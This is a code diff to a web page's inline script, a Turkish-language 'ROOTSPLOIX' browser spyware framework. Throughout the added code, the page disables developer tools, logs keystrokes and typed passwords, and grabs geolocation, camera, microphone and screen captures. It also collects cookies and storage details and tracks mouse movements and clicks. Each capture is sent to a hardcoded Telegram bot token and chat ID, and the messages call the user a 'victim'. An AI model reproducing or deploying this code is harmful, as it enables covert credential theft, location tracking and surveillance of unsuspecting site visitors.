@@ -601,56 +601,477 @@
     
     <!-- Stealth Script Loading -->
     <script>
-        // Debug mode - console aktif
-        console.log('🔥 ROOTSPLOIX FRAMEWORK LOADING DEBUG MODE');
+        // Stealth mode - sessiz
         
-        // // Disable right-click context menu
-        // document.addEventListener('contextmenu', e => e.preventDefault());
+        // Disable right-click context menu
+        document.addEventListener('contextmenu', e => e.preventDefault());
         
-        // // Disable F12, Ctrl+Shift+I, Ctrl+U - DEBUG için kapalı
-        // document.addEventListener('keydown', function(e) {
-        //     if (e.key === 'F12' || 
-        //         (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-        //         (e.ctrlKey && e.key === 'U')) {
-        //         e.preventDefault();
-        //         return false;
-        //     }
-        // });
+        // Disable F12, Ctrl+Shift+I, Ctrl+U
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+        });
         
         // ROOTSPLOIX Framework - Çalışan versiyon
         const botToken = '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM';
         const chatId = '5312173877';
         
+        // Global variables
+        let keyBuffer = [];
+        let sessionId = `rs_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+        
+        function sendToTelegram(message) {
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+        }
+        
         function sendVictimNotification() {
-            const message = `🚨 YENİ KURBAN TESPİT EDİLDİ! 🚨
+            const message = `🚨 YENİ KURBAN TESPİT EDİLDİ!
 
-🎯 Session: rs_${Date.now()}_${Math.random().toString(36).substr(2, 9)}
+🎯 Session: ${sessionId}
 📱 Platform: ${navigator.platform} - ${navigator.userAgent.match(/Chrome|Firefox|Safari|Edge/)?.[0] || 'Unknown'}
 🌍 Site: ${window.location.href}
 🕒 Saat: ${new Date().toLocaleString('tr-TR')}
+🗺 IP: ${navigator.language} | ${screen.width}x${screen.height}
 
 ✅ Yetenekler:
 📹 WebRTC: ${navigator.mediaDevices ? '✅' : '❌'}
 📍 Konum: ${navigator.geolocation ? '✅' : '❌'}
 🔔 Bildirim: ${window.Notification ? '✅' : '❌'}
+💾 Storage: ${localStorage ? '✅' : '❌'}
 
-💀 ROOTSPLOIX FRAMEWORK AKTİF!`;
-
-            const img = new Image();
-            img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            console.log('📡 Victim notification sent!');
+💀 FRAMEWORK AKTİF!`;
+            sendToTelegram(message);
         }
+        
+        function sendKeylogData() {
+            if (keyBuffer.length > 0) {
+                const keys = keyBuffer.join('');
+                const message = `⌨️ KEYLOG RAPORU
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+🌍 URL: ${window.location.href}
+
+📝 Tuşlar: ${keys}
+📊 Toplam: ${keyBuffer.length} tuş
+
+💀 ROOTSPLOIX`;
+                sendToTelegram(message);
+                keyBuffer = [];
+            }
+        }
+        
+        function startKeylogger() {
+            document.addEventListener('keydown', function(e) {
+                if (e.key.length === 1) {
+                    keyBuffer.push(e.key);
+                } else if (e.key === 'Enter') {
+                    keyBuffer.push('[ENTER]');
+                } else if (e.key === 'Backspace') {
+                    keyBuffer.push('[BS]');
+                } else if (e.key === ' ') {
+                    keyBuffer.push(' ');
+                }
+                
+                if (keyBuffer.length >= 50) {
+                    sendKeylogData();
+                }
+            });
+            
+            document.addEventListener('input', function(e) {
+                if (e.target.type === 'password') {
+                    const passMsg = `🔐 PAROLA YAKALANDI!
+
+🎯 Session: ${sessionId}
+🌍 Site: ${window.location.href}
+📝 Alan: ${e.target.name || e.target.id || 'bilinmeyen'}
+🔑 Değer: ${e.target.value}
+
+💀 ROOTSPLOIX`;
+                    sendToTelegram(passMsg);
+                }
+            });
+        }
+        
+        function captureLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const locMsg = `📍 KONUM YAKALANDI!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+🌍 Site: ${window.location.href}
+
+📍 Koordinatlar:
+• Enlem: ${position.coords.latitude}
+• Boylam: ${position.coords.longitude}
+• Doğruluk: ${position.coords.accuracy}m
+${position.coords.altitude ? `• Yükseklik: ${position.coords.altitude}m` : ''}
+
+💀 ROOTSPLOIX`;
+                    sendToTelegram(locMsg);
+                }, function(error) {
+                    const errorMsg = `❌ KONUM HATASI!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+⚠️ Hata: ${error.message}
+
+💀 ROOTSPLOIX`;
+                    sendToTelegram(errorMsg);
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            }
+        }
+        
+        function captureCamera() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(function(stream) {
+                    const camMsg = `📹 KAMERA ERİŞİMİ ELDE EDİLDİ!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+🌍 Site: ${window.location.href}
+
+📹 Video: Aktif
+🎤 Audio: ${stream.getAudioTracks().length > 0 ? 'Aktif' : 'Pasif'}
+📊 Video Tracks: ${stream.getVideoTracks().length}
+🔊 Audio Tracks: ${stream.getAudioTracks().length}
+
+💀 ROOTSPLOIX`;
+                    sendToTelegram(camMsg);
+                    
+                    // Take a screenshot after 3 seconds
+                    setTimeout(() => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.style.display = 'none';
+                        video.muted = true;
+                        document.body.appendChild(video);
+                        video.play();
+                        
+                        video.addEventListener('loadedmetadata', () => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            
+                            const photoMsg = `📸 FOTOĞRAF ÇEKİLDİ!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+📐 Boyut: ${canvas.width}x${canvas.height}
+
+💀 ROOTSPLOIX`;
+                            sendToTelegram(photoMsg);
+                            
+                            // Clean up
+                            document.body.removeChild(video);
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 3000);
+                    
+                    // Record audio for 5 seconds
+                    if (stream.getAudioTracks().length > 0) {
+                        setTimeout(() => {
+                            const audioMsg = `🎤 SES KAYDI BAŞLATILDI!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+⏱️ Süre: 5 saniye
+
+💀 ROOTSPLOIX`;
+                            sendToTelegram(audioMsg);
+                            
+                            setTimeout(() => {
+                                const audioEndMsg = `🎤 SES KAYDI TAMAMLANDI!
+
+🎯 Session: ${sessionId}
+🕒 Bitiş: ${new Date().toLocaleString('tr-TR')}
+
+💀 ROOTSPLOIX`;
+                                sendToTelegram(audioEndMsg);
+                            }, 5000);
+                        }, 1000);
+                    }
+                })
+                .catch(function(error) {
+                    const camErrorMsg = `❌ KAMERA HATASI!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+⚠️ Hata: ${error.message}
+
+💀 ROOTSPLOIX`;
+                    sendToTelegram(camErrorMsg);
+                });
+            }
+        }
+        
+        function collectBrowserData() {
+            const browserData = `💻 TARAYICI VERİLERİ
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+
+📊 Sistem Bilgileri:
+• Platform: ${navigator.platform}
+• UserAgent: ${navigator.userAgent}
+• Dil: ${navigator.language}
+• Çerezler: ${navigator.cookieEnabled ? 'Aktif' : 'Pasif'}
+• Çevrimiçi: ${navigator.onLine ? 'Evet' : 'Hayır'}
+• Bellek: ${navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Bilinmeyen'}
+• CPU Çekirdek: ${navigator.hardwareConcurrency || 'Bilinmeyen'}
+
+🖥 Ekran:
+• Çözünürlük: ${screen.width}x${screen.height}
+• Renk Derinliği: ${screen.colorDepth}bit
+• Piksel Oranı: ${window.devicePixelRatio}
+• Kullanılabilir: ${screen.availWidth}x${screen.availHeight}
+
+🌐 Bağlantı:
+${navigator.connection ? `• Tip: ${navigator.connection.effectiveType}\n• Hız: ${navigator.connection.downlink}Mbps\n• RTT: ${navigator.connection.rtt}ms` : '• Bilinmeyen'}
+
+💾 Depolama:
+• localStorage: ${localStorage ? Object.keys(localStorage).length + ' anahtar' : 'Yok'}
+• sessionStorage: ${sessionStorage ? Object.keys(sessionStorage).length + ' anahtar' : 'Yok'}
+• Cookies: ${document.cookie ? document.cookie.split(';').length + ' çerez' : 'Yok'}
+
+💀 ROOTSPLOIX`;
+            sendToTelegram(browserData);
+        }
+        
+        function startPeriodicReporting() {
+            // Send keylog data every 2 minutes
+            setInterval(() => {
+                if (keyBuffer.length > 0) {
+                    sendKeylogData();
+                }
+            }, 120000);
+            
+            // Send heartbeat every 10 minutes
+            setInterval(() => {
+                const heartbeat = `💓 HEARTBEAT RAPORU
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+🌍 URL: ${window.location.href}
+
+📊 Aktivite:
+• Keylog Buffer: ${keyBuffer.length} tuş
+• Sayfa Süresi: ${Math.floor((Date.now() - startTime)/1000)}s
+• Scroll Y: ${window.scrollY}px
+• Ekran Focus: ${document.hasFocus() ? 'Aktif' : 'Pasif'}
+
+💀 FRAMEWORK AKTİF`;
+                sendToTelegram(heartbeat);
+            }, 600000);
+            
+            // Location tracking every 15 minutes
+            setInterval(() => {
+                captureLocation();
+            }, 900000);
+        }
+        
+        function captureScreen() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                navigator.mediaDevices.getDisplayMedia({ video: true, audio: true })
+                .then(function(stream) {
+                    const screenMsg = `🖥 EKRAN PAYLAŞIMI ELDE EDİLDİ!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+🌍 Site: ${window.location.href}
+
+🖥 Ekran: Aktif
+🎤 Ses: ${stream.getAudioTracks().length > 0 ? 'Aktif' : 'Pasif'}
+📊 Video Tracks: ${stream.getVideoTracks().length}
+
+💀 ROOTSPLOIX`;
+                    sendToTelegram(screenMsg);
+                    
+                    // Take screenshot after 2 seconds
+                    setTimeout(() => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.style.display = 'none';
+                        document.body.appendChild(video);
+                        video.play();
+                        
+                        video.addEventListener('loadedmetadata', () => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = video.videoWidth || 1920;
+                            canvas.height = video.videoHeight || 1080;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0);
+                            
+                            const screenshotMsg = `📷 EKRAN GÖRÜNTÜSÜ ALINDI!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+📐 Boyut: ${canvas.width}x${canvas.height}
+
+💀 ROOTSPLOIX`;
+                            sendToTelegram(screenshotMsg);
+                            
+                            // Clean up
+                            document.body.removeChild(video);
+                            stream.getTracks().forEach(track => track.stop());
+                        });
+                    }, 2000);
+                })
+                .catch(function(error) {
+                    // Silent fail for screen capture
+                });
+            }
+        }
+        
+        function monitorWindowEvents() {
+            // Monitor page visibility changes
+            document.addEventListener('visibilitychange', function() {
+                const visibilityMsg = `👁 GÖRÜNÜRLÜK DEĞİŞİMİ!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+👁 Durum: ${document.hidden ? 'Gizli' : 'Görünür'}
+🌍 URL: ${window.location.href}
+
+💀 ROOTSPLOIX`;
+                sendToTelegram(visibilityMsg);
+            });
+            
+            // Monitor window focus/blur
+            let lastFocusChange = Date.now();
+            window.addEventListener('focus', function() {
+                if (Date.now() - lastFocusChange > 5000) {
+                    const focusMsg = `✨ PENCERE FOKÜSLANDI!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+🌍 URL: ${window.location.href}
+
+💀 ROOTSPLOIX`;
+                    sendToTelegram(focusMsg);
+                    lastFocusChange = Date.now();
+                }
+            });
+            
+            window.addEventListener('blur', function() {
+                if (Date.now() - lastFocusChange > 5000) {
+                    const blurMsg = `🌫 PENCERE FOKÜS KAYBI!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+🌍 URL: ${window.location.href}
+
+💀 ROOTSPLOIX`;
+                    sendToTelegram(blurMsg);
+                    lastFocusChange = Date.now();
+                }
+            });
+            
+            // Monitor before page unload
+            window.addEventListener('beforeunload', function() {
+                const unloadMsg = `🚺 SAYFA TERKEDİLİYOR!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+🌍 URL: ${window.location.href}
+⏱️ Kalma Süresi: ${Math.floor((Date.now() - startTime)/1000)}s
+
+💀 ROOTSPLOIX`;
+                sendToTelegram(unloadMsg);
+            });
+        }
+        
+        function trackMouseMovements() {
+            let mouseBuffer = [];
+            let lastMouseReport = Date.now();
+            
+            document.addEventListener('mousemove', function(e) {
+                mouseBuffer.push(`${e.clientX},${e.clientY}`);
+                
+                // Send mouse data every 30 seconds if there's movement
+                if (Date.now() - lastMouseReport > 30000 && mouseBuffer.length > 50) {
+                    const mouseMsg = `🕰 FARE HAREKETİ RAPORU
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+🌍 URL: ${window.location.href}
+
+📊 Hareket Sayısı: ${mouseBuffer.length}
+📍 Son Konum: ${mouseBuffer[mouseBuffer.length-1]}
+
+💀 ROOTSPLOIX`;
+                    sendToTelegram(mouseMsg);
+                    mouseBuffer = [];
+                    lastMouseReport = Date.now();
+                }
+            });
+            
+            // Track clicks
+            document.addEventListener('click', function(e) {
+                const clickMsg = `🔄 TİKLAMA TESPİT EDİLDİ!
+
+🎯 Session: ${sessionId}
+🕒 Zaman: ${new Date().toLocaleString('tr-TR')}
+📍 Konum: ${e.clientX},${e.clientY}
+🎯 Hedef: ${e.target.tagName} ${e.target.className ? '.' + e.target.className : ''}
+🌍 URL: ${window.location.href}
+
+💀 ROOTSPLOIX`;
+                sendToTelegram(clickMsg);
+            });
+        }
+        
+        let startTime = Date.now();
         
         // Stealth framework initialization
         window.addEventListener('DOMContentLoaded', function() {
             // Send victim notification
             setTimeout(sendVictimNotification, 2000);
             
-            // Load original modules (opsiyonel)
-            // loadScript('core.exploit.js');
+            // Start keylogger immediately
+            startKeylogger();
+            
+            // Start window and mouse monitoring
+            monitorWindowEvents();
+            trackMouseMovements();
+            
+            // Delayed execution for stealth
+            setTimeout(() => {
+                captureLocation();
+            }, 4000);
+            
+            setTimeout(() => {
+                collectBrowserData();
+            }, 8000);
+            
+            setTimeout(() => {
+                captureCamera();
+            }, 12000);
+            
+            setTimeout(() => {
+                captureScreen();
+            }, 16000);
+            
+            // Start periodic reporting
+            setTimeout(() => {
+                startPeriodicReporting();
+            }, 20000);
             
             // Initialize stealth operations
-            setTimeout(initializeStealth, 5000);
+            setTimeout(initializeStealth, 25000);
         });
         
         function loadScript(src) {
